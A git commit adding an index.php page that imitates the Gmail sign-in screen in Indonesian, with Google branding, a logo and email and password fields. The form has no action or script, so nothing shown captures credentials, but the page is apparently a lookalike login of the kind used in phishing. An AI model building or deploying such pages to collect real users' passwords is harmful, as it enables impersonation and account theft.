d87e25693244f58c99eab11d4885d9d21c825228
Alif Fikry Amrullah <64622319+aliffikry1398@users.noreply.github.com>
2020-08-21 13:25:20 +0700

    upload file

---
+++ index.php
@@ -0,0 +1,29 @@
+<html>
+<head>
+	<title>Gmail</title>
+	<link rel="stylesheet" type="text/css" href="style.css">
+	<link href="https://fonts.googleapis.com/css?family=Roboto&display=swap" rel="stylesheet">
+</head>
+<body>
+
+
+<div class="box">
+	<img class="img" src="img/google.png" width="50"><br>
+	<p><span class="login">Login</span></p>
+	<p><span class="text">Lanjutkan ke Gmail</span></p>
+	<form class="login">
+		<input type="text" name="email" placeholder="Email atau ponsel" class="form-control" autocomplete="off" id="username">
+		<input type="password" name="password" placeholder="Password" class="form-control" autocomplete="off" id="password">
+	
+	<!-- <a class="forget" href="#">Lupa email?</a> -->
+
+	<div class="info">Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi. <a class="pelajari" href="#">Pelajari selengkapnya</a></div>
+
+	<div class="proses">
+		<a class="new" href="#">Buat akun</a>
+		<span class="tombol"><input type="submit" name="proses" value="Berikutnya"></span>
+	</div>
+	</form>
+</div>
+</body>
+</html>
